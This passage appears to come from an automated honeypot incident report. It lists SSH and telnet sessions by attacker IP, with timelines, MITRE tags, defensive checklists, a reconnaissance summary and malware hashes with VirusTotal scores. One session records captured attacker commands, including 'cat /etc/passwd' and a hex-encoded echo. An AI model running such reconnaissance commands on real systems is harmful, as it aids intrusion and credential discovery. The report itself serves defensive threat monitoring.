- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1233b51cfc

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-08-01 14:35 |
| **Last Seen** | 2026-08-01 14:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:35:36` | `cowrie.session.connect` |
| `2026-08-01 14:35:37` | `cowrie.client.version` |
| `2026-08-01 14:35:37` | `cowrie.client.kex` |
| `2026-08-01 14:35:39` | `cowrie.login.success` |
| `2026-08-01 14:35:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab49d428e2f1

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:45 |
| **Last Seen** | 2026-08-01 14:45 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:45:03` | `cowrie.session.connect` |
| `2026-08-01 14:45:04` | `cowrie.login.success` |
| `2026-08-01 14:45:05` | `cowrie.session.params` |
| `2026-08-01 14:45:05` | `cowrie.command.input` |
| `2026-08-01 14:45:05` | `cowrie.command.failed` |
| `2026-08-01 14:45:05` | `cowrie.command.input` |
| `2026-08-01 14:45:05` | `cowrie.command.failed` |
| `2026-08-01 14:45:06` | `cowrie.command.input` |
| `2026-08-01 14:45:06` | `cowrie.command.failed` |
| `2026-08-01 14:45:06` | `cowrie.command.input` |
| `2026-08-01 14:45:06` | `cowrie.command.failed` |
| `2026-08-01 14:45:07` | `cowrie.command.input` |
| `2026-08-01 14:45:07` | `cowrie.command.input` |
| `2026-08-01 14:45:07` | `cowrie.command.failed` |
| `2026-08-01 14:45:07` | `cowrie.command.failed` |
| `2026-08-01 14:45:38` | `cowrie.log.closed` |
| `2026-08-01 14:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e3ea163300

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:45 |
| **Last Seen** | 2026-08-01 14:46 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:45:38` | `cowrie.session.connect` |
| `2026-08-01 14:45:39` | `cowrie.login.success` |
| `2026-08-01 14:45:39` | `cowrie.login.success` |
| `2026-08-01 14:45:40` | `cowrie.session.params` |
| `2026-08-01 14:45:40` | `cowrie.command.input` |
| `2026-08-01 14:45:40` | `cowrie.command.failed` |
| `2026-08-01 14:45:41` | `cowrie.command.input` |
| `2026-08-01 14:45:41` | `cowrie.command.failed` |
| `2026-08-01 14:45:41` | `cowrie.command.input` |
| `2026-08-01 14:45:41` | `cowrie.command.input` |
| `2026-08-01 14:45:41` | `cowrie.command.failed` |
| `2026-08-01 14:45:41` | `cowrie.command.failed` |
| `2026-08-01 14:46:12` | `cowrie.log.closed` |
| `2026-08-01 14:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632958e4cbea

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:46 |
| **Last Seen** | 2026-08-01 14:46 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:46:12` | `cowrie.session.connect` |
| `2026-08-01 14:46:13` | `cowrie.login.success` |
| `2026-08-01 14:46:13` | `cowrie.login.success` |
| `2026-08-01 14:46:14` | `cowrie.session.params` |
| `2026-08-01 14:46:14` | `cowrie.command.input` |
| `2026-08-01 14:46:14` | `cowrie.command.failed` |
| `2026-08-01 14:46:15` | `cowrie.command.input` |
| `2026-08-01 14:46:15` | `cowrie.command.failed` |
| `2026-08-01 14:46:15` | `cowrie.command.input` |
| `2026-08-01 14:46:15` | `cowrie.command.input` |
| `2026-08-01 14:46:15` | `cowrie.command.failed` |
| `2026-08-01 14:46:15` | `cowrie.command.failed` |
| `2026-08-01 14:46:46` | `cowrie.log.closed` |
| `2026-08-01 14:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae7e2d531c7

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:46 |
| **Last Seen** | 2026-08-01 14:47 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:46:46` | `cowrie.session.connect` |
| `2026-08-01 14:46:47` | `cowrie.login.success` |
| `2026-08-01 14:46:48` | `cowrie.login.success` |
| `2026-08-01 14:46:48` | `cowrie.session.params` |
| `2026-08-01 14:46:49` | `cowrie.command.input` |
| `2026-08-01 14:46:49` | `cowrie.command.failed` |
| `2026-08-01 14:46:49` | `cowrie.command.input` |
| `2026-08-01 14:46:49` | `cowrie.command.failed` |
| `2026-08-01 14:46:49` | `cowrie.command.input` |
| `2026-08-01 14:46:49` | `cowrie.command.input` |
| `2026-08-01 14:46:49` | `cowrie.command.failed` |
| `2026-08-01 14:46:49` | `cowrie.command.failed` |
| `2026-08-01 14:47:21` | `cowrie.log.closed` |
| `2026-08-01 14:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deeb96cd12b6

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:47 |
| **Last Seen** | 2026-08-01 14:47 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:47:21` | `cowrie.session.connect` |
| `2026-08-01 14:47:22` | `cowrie.login.success` |
| `2026-08-01 14:47:22` | `cowrie.session.params` |
| `2026-08-01 14:47:23` | `cowrie.command.input` |
| `2026-08-01 14:47:23` | `cowrie.command.failed` |
| `2026-08-01 14:47:23` | `cowrie.command.input` |
| `2026-08-01 14:47:23` | `cowrie.command.failed` |
| `2026-08-01 14:47:23` | `cowrie.command.input` |
| `2026-08-01 14:47:23` | `cowrie.command.failed` |
| `2026-08-01 14:47:24` | `cowrie.command.input` |
| `2026-08-01 14:47:24` | `cowrie.command.failed` |
| `2026-08-01 14:47:24` | `cowrie.command.input` |
| `2026-08-01 14:47:24` | `cowrie.command.input` |
| `2026-08-01 14:47:24` | `cowrie.command.failed` |
| `2026-08-01 14:47:24` | `cowrie.command.failed` |
| `2026-08-01 14:47:55` | `cowrie.log.closed` |
| `2026-08-01 14:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8257139998f6

| Field | Detail |
|---|---|
| **Source IP** | `167.148.33[.]174` |
| **First Seen** | 2026-08-01 14:47 |
| **Last Seen** | 2026-08-01 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:47:34` | `cowrie.session.connect` |
| `2026-08-01 14:47:34` | `cowrie.telnet.option` |
| `2026-08-01 14:47:34` | `cowrie.telnet.option` |
| `2026-08-01 14:47:34` | `cowrie.login.success` |
| `2026-08-01 14:47:35` | `cowrie.session.params` |
| `2026-08-01 14:47:35` | `cowrie.telnet.option` |
| `2026-08-01 14:47:35` | `cowrie.telnet.option` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.failed` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.failed` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.failed` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.command.input` |
| `2026-08-01 14:47:35` | `cowrie.log.closed` |
| `2026-08-01 14:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.148.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `167.148.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3874bee733

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:47 |
| **Last Seen** | 2026-08-01 14:48 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:47:55` | `cowrie.session.connect` |
| `2026-08-01 14:47:56` | `cowrie.login.success` |
| `2026-08-01 14:47:56` | `cowrie.login.success` |
| `2026-08-01 14:47:57` | `cowrie.session.params` |
| `2026-08-01 14:47:57` | `cowrie.command.input` |
| `2026-08-01 14:47:57` | `cowrie.command.failed` |
| `2026-08-01 14:47:58` | `cowrie.command.input` |
| `2026-08-01 14:47:58` | `cowrie.command.failed` |
| `2026-08-01 14:47:58` | `cowrie.command.input` |
| `2026-08-01 14:47:58` | `cowrie.command.input` |
| `2026-08-01 14:47:58` | `cowrie.command.failed` |
| `2026-08-01 14:47:58` | `cowrie.command.failed` |
| `2026-08-01 14:48:29` | `cowrie.log.closed` |
| `2026-08-01 14:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a747640a98

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:48 |
| **Last Seen** | 2026-08-01 14:49 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:48:29` | `cowrie.session.connect` |
| `2026-08-01 14:48:30` | `cowrie.login.success` |
| `2026-08-01 14:48:30` | `cowrie.login.success` |
| `2026-08-01 14:48:31` | `cowrie.session.params` |
| `2026-08-01 14:48:31` | `cowrie.command.input` |
| `2026-08-01 14:48:31` | `cowrie.command.failed` |
| `2026-08-01 14:48:32` | `cowrie.command.input` |
| `2026-08-01 14:48:32` | `cowrie.command.failed` |
| `2026-08-01 14:48:32` | `cowrie.command.input` |
| `2026-08-01 14:48:32` | `cowrie.command.input` |
| `2026-08-01 14:48:32` | `cowrie.command.failed` |
| `2026-08-01 14:48:32` | `cowrie.command.failed` |
| `2026-08-01 14:49:03` | `cowrie.log.closed` |
| `2026-08-01 14:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9104b8a0ff

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:49 |
| **Last Seen** | 2026-08-01 14:49 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:49:03` | `cowrie.session.connect` |
| `2026-08-01 14:49:04` | `cowrie.login.success` |
| `2026-08-01 14:49:04` | `cowrie.session.params` |
| `2026-08-01 14:49:04` | `cowrie.command.input` |
| `2026-08-01 14:49:04` | `cowrie.command.failed` |
| `2026-08-01 14:49:05` | `cowrie.command.input` |
| `2026-08-01 14:49:05` | `cowrie.command.failed` |
| `2026-08-01 14:49:05` | `cowrie.command.input` |
| `2026-08-01 14:49:05` | `cowrie.command.failed` |
| `2026-08-01 14:49:06` | `cowrie.command.input` |
| `2026-08-01 14:49:06` | `cowrie.command.failed` |
| `2026-08-01 14:49:06` | `cowrie.command.input` |
| `2026-08-01 14:49:06` | `cowrie.command.input` |
| `2026-08-01 14:49:06` | `cowrie.command.failed` |
| `2026-08-01 14:49:06` | `cowrie.command.failed` |
| `2026-08-01 14:49:37` | `cowrie.log.closed` |
| `2026-08-01 14:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffef1d28d5ba

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:49 |
| **Last Seen** | 2026-08-01 14:50 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:49:38` | `cowrie.session.connect` |
| `2026-08-01 14:49:39` | `cowrie.login.success` |
| `2026-08-01 14:49:39` | `cowrie.login.success` |
| `2026-08-01 14:49:40` | `cowrie.session.params` |
| `2026-08-01 14:49:41` | `cowrie.command.input` |
| `2026-08-01 14:49:41` | `cowrie.command.failed` |
| `2026-08-01 14:49:41` | `cowrie.command.input` |
| `2026-08-01 14:49:41` | `cowrie.command.failed` |
| `2026-08-01 14:49:41` | `cowrie.command.input` |
| `2026-08-01 14:49:41` | `cowrie.command.input` |
| `2026-08-01 14:49:41` | `cowrie.command.failed` |
| `2026-08-01 14:49:41` | `cowrie.command.failed` |
| `2026-08-01 14:50:13` | `cowrie.log.closed` |
| `2026-08-01 14:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1885eec596c

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-08-01 14:50 |
| **Last Seen** | 2026-08-01 14:50 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:50:13` | `cowrie.session.connect` |
| `2026-08-01 14:50:14` | `cowrie.login.success` |
| `2026-08-01 14:50:14` | `cowrie.session.params` |
| `2026-08-01 14:50:15` | `cowrie.command.input` |
| `2026-08-01 14:50:15` | `cowrie.command.failed` |
| `2026-08-01 14:50:15` | `cowrie.command.input` |
| `2026-08-01 14:50:15` | `cowrie.command.failed` |
| `2026-08-01 14:50:15` | `cowrie.command.input` |
| `2026-08-01 14:50:15` | `cowrie.command.failed` |
| `2026-08-01 14:50:16` | `cowrie.command.input` |
| `2026-08-01 14:50:16` | `cowrie.command.failed` |
| `2026-08-01 14:50:16` | `cowrie.command.input` |
| `2026-08-01 14:50:16` | `cowrie.command.input` |
| `2026-08-01 14:50:16` | `cowrie.command.failed` |
| `2026-08-01 14:50:16` | `cowrie.command.failed` |
| `2026-08-01 14:50:47` | `cowrie.log.closed` |
| `2026-08-01 14:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-08-01 12:59 | 2026-08-01 14:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **4** | 2026-08-01 13:35 | 2026-08-01 14:51 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-01 13:28 | 2026-08-01 13:28 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-01 14:42 | 2026-08-01 14:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-01 13:00 | 2026-08-01 13:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-01 14:31 | 2026-08-01 14:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.110.144[.]94` | **2** | 2026-08-01 13:47 | 2026-08-01 14:14 | 1m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.232[.]58` | **2** | 2026-08-01 13:17 | 2026-08-01 13:19 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-01 13:13 | 2026-08-01 14:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.154[.]127` | **2** | 2026-08-01 13:34 | 2026-08-01 13:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.168[.]113` | **2** | 2026-08-01 13:32 | 2026-08-01 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]116` | **2** | 2026-08-01 13:04 | 2026-08-01 13:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.27.129[.]78` | 1 | 2026-08-01 14:27 | 2026-08-01 14:27 | 7s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-08-01 13:53 | 2026-08-01 13:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.114.84[.]246` | 1 | 2026-08-01 13:06 | 2026-08-01 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-08-01 13:50 | 2026-08-01 13:50 | 2s | 0 | `T1592` | 🟢 LOW |
| `179.181.133[.]153` | 1 | 2026-08-01 13:16 | 2026-08-01 13:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-08-01 13:53 | 2026-08-01 13:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-01 13:08 | 2026-08-01 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-08-01 13:01 | 2026-08-01 13:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.227.140[.]178` | 1 | 2026-08-01 14:13 | 2026-08-01 14:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.76.28[.]231` | 1 | 2026-08-01 13:38 | 2026-08-01 13:38 | 31s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-01 13:09 | 2026-08-01 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-08-01 14:36 | 2026-08-01 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.98.41[.]27` | 1 | 2026-08-01 13:51 | 2026-08-01 13:51 | 9s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-01 14:17 | 2026-08-01 14:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-01 13:14 | 2026-08-01 13:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
